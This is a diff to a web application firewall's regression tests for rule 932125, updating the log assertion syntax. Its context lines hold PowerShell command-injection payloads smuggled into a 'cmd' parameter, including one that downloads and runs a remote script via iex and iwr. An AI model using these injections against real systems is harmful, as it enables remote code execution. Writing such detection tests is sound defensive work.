@@ -17,7 +17,8 @@ tests:
           uri: "/get?cmd=%3Biwr%20http://example.com/path/file.ps1"
           version: "HTTP/1.1"
         output:
-          log_contains: id "932125"
+          log:
+            expect_ids: [932125]
   - test_id: 2
     desc: "Test for BB finding VYYFBP5V"
     stages:
@@ -32,7 +33,8 @@ tests:
           uri: "/get?cmd=%3Biwmi%20-class%20Win32_process%20-name%20Create%20-ArgumentList%20cmd"
           version: "HTTP/1.1"
         output:
-          log_contains: id "932125"
+          log:
+            expect_ids: [932125]
   - test_id: 3
     desc: "Test for BB finding VYYFBP5V"
     stages:
@@ -48,4 +50,5 @@ tests:
           data: cmd=;iex (iwr http://10.0.10.10:8000/x.ps1)
           version: "HTTP/1.1"
         output:
-          log_contains: id "932125"
+          log:
+            expect_ids: [932125]
